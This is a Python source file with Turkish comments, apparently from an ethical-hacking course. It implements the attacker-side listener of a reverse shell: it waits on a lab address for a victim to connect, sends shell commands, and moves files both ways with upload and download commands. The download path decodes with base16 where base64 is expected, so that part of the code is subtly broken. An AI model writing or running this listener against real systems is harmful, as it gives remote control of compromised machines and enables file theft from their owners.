import base64
import socket
import simplejson
import  base64 # base64 encoding için

class SocketListener:
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print("Listening...")
        (self.my_connection, self.my_adress) = my_listener.accept()
        print("Connection OK from" + str(self.my_adress))
    def json_send(self,data):
        json_data=simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data=""
        while True: # işlem jsona döndürene kadar devam et
            try:
                json_data=json_data+self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError: # bitmezse
                continue # devam et
    def command_execution(self,command_input):
        #self.my_connection.send(self.command_input)  # komutu yolladım.
        self.json_send(command_input)
        if command_input[0]=="quit": # gelen komut quit se
            self.my_connection.close() # bağlantıyı sonlandır
            exit() # çıkıs yap

        return self.json_receive()
    def save_file(self,path,content): # dosya ismi dosya içeriği
        with open(path,"wb") as myfile: #binary olar yaz
            myfile.write(base64.b16decode(content))
            return "Download OK"
    def read_file(self,path):
        with open(path, "rb") as myfile:  # path dosyasını oku binary olarak
            return base64.b64encode(myfile.read())
    def start_listener(self):
        while True:
            command_input=input("Enter command:")
            command_input=command_input.split(" ") #her bosluk görğünde ikiye bölcek
            #download python.txt
            try:
                if  command_input[0]=="upload":
                    my_file_content=self.read_file(command_input[1])
                    command_input.append(my_file_content)  #inputa ekle
                command_output=self.command_execution(command_input)
                if command_input[0]=="download" and "Error!" not in command_output:
                    command_output = self.save_file(command_input[1],command_output)
            except Exception:
                command_output="Error"
            print(command_output)

my_socket_listener=SocketListener("10.0.2.15",8080)
my_socket_listener.start_listener();
